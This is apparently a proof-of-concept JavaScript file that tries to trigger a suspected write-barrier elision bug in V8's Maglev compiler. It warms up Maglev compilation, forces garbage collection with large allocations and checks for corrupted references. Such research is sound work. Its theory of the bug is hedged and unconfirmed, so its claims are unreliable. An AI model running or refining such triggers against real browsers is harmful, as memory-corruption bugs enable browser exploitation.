// PoC: Maglev Write Barrier Elision on Same-Allocation-Block
// Target: maglev-graph-builder.cc CanElideWriteBarrier (line ~4495)
//
// When two objects are in the same young allocation block, the write barrier
// is elided. If a GC promotes the block to old space but the code isn't
// invalidated, old-to-young pointers are created without write barriers.
//
// The elided_write_barriers_depend_on_type flag is set but enforcement
// is not guaranteed in all code paths.

function triggerWriteBarrierBug(n) {
  let results = [];
  
  for (let i = 0; i < n; i++) {
    // These two allocations should be in the same allocation block
    // Write barrier for b.ref = a is elided because same young block
    let a = { x: i, y: i + 1 };
    let b = { ref: a, z: i + 2 };
    
    results.push(b);
  }
  
  return results;
}

// Phase 1: Warmup with Maglev compilation
for (let i = 0; i < 50000; i++) {
  triggerWriteBarrierBug(1);
}

// Phase 2: Trigger with allocations that will be promoted
// The compiled code still has elided write barriers
let arr = triggerWriteBarrierBug(100);

// Phase 3: Force GC pressure to promote young objects
// The objects from triggerWriteBarrierBug are now in old space
// but future calls still use code with elided write barriers
for (let i = 0; i < 20; i++) {
  // Allocate large objects to trigger GC
  new ArrayBuffer(1024 * 1024 * 2);
  
  // Call again - compiled code with elided WB writes to promoted objects
  let more = triggerWriteBarrierBug(10);
  
  // Verify references are still valid
  for (let j = 0; j < more.length; j++) {
    if (more[j].ref === undefined || more[j].ref.x === undefined) {
      console.log("BUG: Corrupted reference at iteration " + i + ", index " + j);
    }
  }
}

console.log("Write barrier test completed");
